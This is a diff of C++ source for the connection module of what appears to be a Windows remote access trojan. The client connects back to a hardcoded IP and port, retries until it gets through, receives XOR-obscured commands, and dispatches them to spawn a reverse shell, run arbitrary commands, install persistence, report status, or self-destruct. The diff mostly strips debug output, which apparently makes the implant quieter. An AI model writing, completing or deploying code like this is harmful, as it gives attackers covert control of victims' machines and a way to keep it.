@@ -26,16 +26,13 @@ int Connexion::openConnexion()
     SOCKET sock;
     SOCKADDR_IN address_client;
 
-//     SOCKADDR_IN address_client_tmp;
     sock_client = sock; //Find one alternativ
-    //cout <<"SOCKET: " <<sock << endl;
-    //cout <<"after socket sock: " <<sock_client <<endl;
+
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
     sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
-    //sock_client = socket(AF_INET, SOCK_STREAM, 0);
-    //cout <<"SOCK CREATE" <<endl;
+
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
@@ -43,7 +40,7 @@ int Connexion::openConnexion()
     while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
         Sleep(TIMEOUT_SOCK_RECONNECT);
-        //cout << "Whait...." <<endl;  
+        //Whait...;  
     } 
     return 0;
 }
@@ -62,19 +59,15 @@ int Connexion::main()
     while(true)
     {
         //Sleep(1000);
-        //cout << "in main...." << endl;
+
         command = recvSafe(); //Recv safe and decrypt xor
-        cout << command << endl;
-        cout << "len: " << command.length() << endl;
-        if(command.length() >= 15)
-        {
-            cout << "--->" << command.substr(0,15) << endl;
-        }
+
         if(command.find("is_life?") != string::npos)
         {
             ;
             //if find is_life then continue
         }
+
         else
         {
             //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
@@ -100,6 +93,7 @@ int Connexion::main()
                 }
                 sendSafe(result);
             }
+
             else if(command.substr(0,16) == "MOD_SPAWN_SHELL:")
             {   
                 wchar_t prog[20];
@@ -121,13 +115,11 @@ int Connexion::main()
             }
             else if(command.substr(0,8)=="MOD_ALL:")
             {
-                cout << "Mod all" << endl;
-                Exec().executeCommand(command.substr(8));
-                
+                Exec().executeCommand(command.substr(8));   
             }
+
             else if (command.substr(0,16) =="MOD_PERSISTENCE:")   //A CHANGER !!!!!!
             {
-                cout << "IN mod persi " << endl;
                 //In mod persistence.
                 Persistence persistence(a_is_admin, a_path_prog);
                 persistence.main();
@@ -139,7 +131,8 @@ int Connexion::main()
                 }
                 else
                 {
-                    cout << "broadcast persi" << endl;
+                    //cout << "broadcast persi" << endl;
+                    ;
                 }
             }
             
@@ -148,8 +141,6 @@ int Connexion::main()
                 string name_prog = NAME_PROG; //To change
                 wstring name_prog_unicode(name_prog.begin(), name_prog.end()) ; //To change
                 wstring path_prog_unicode(a_path_prog.begin(), a_path_prog.end());
-                
-                cout << "MOD DESTRUCTION !" << endl;
                 
                 Destruction destruction(name_prog_unicode, path_prog_unicode);
 
@@ -169,16 +160,15 @@ int Connexion::main()
 
                 if(command.substr(16,7) == "default") //6 for default
                 {
-                    //if default then send status at server.
-                    cout << "persi default: "<< status << endl;
+                    //if default then send status at server. 
+                    //send default persi
                     send(sock_client, XOREncryption(status).c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
-                    cout << "send status" << endl;
                 }
                 
                 else //else  substr(15,6) == "broadcast"
                 {
                     //not send status
-                    cout << "BROADCAST DESTRUCTION !!!!" << endl; 
+                    ;
                 }
                 closeConnexion();
                 exit(0);
@@ -356,7 +346,6 @@ void Connexion::setToken(string token)
     else
     {
         //if token is empty.
-        cout << "TOKEN EMPTY GO TO GENERATE NEW A TOKEN" << endl;
         char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
         int i;
 
